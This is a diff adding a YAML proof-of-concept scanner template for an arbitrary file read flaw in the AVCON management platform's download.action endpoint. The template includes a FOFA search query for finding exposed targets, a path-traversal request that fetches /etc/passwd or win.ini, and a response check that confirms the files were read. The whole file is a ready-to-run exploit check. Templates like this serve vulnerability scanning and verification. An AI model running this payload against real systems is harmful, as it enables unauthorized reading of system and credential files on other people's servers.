@@ -1,0 +1,21 @@
+id: poc-yaml-avcon-download-action-anyfile-read
+info:
+  name: Avcon综合管理平台 download.action 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: avcon
+  fofa: title="AVCON-系统管理平台"
+variables:
+  files: '../etc/passwd
+
+    c:/windows/win.ini
+
+    '
+requests:
+- method: GET
+  path: /download.action?filename=../../../../../../../{{.files}}
+  expression: (status_code == 200 && !contains(body,"<")) && ( (contains(body,"root:")
+    && contains(headers,`filename="../../../../../../../..`)) || (contains(body,"bit
+    app support") && contains(body,"[files]")) )
+transport: http
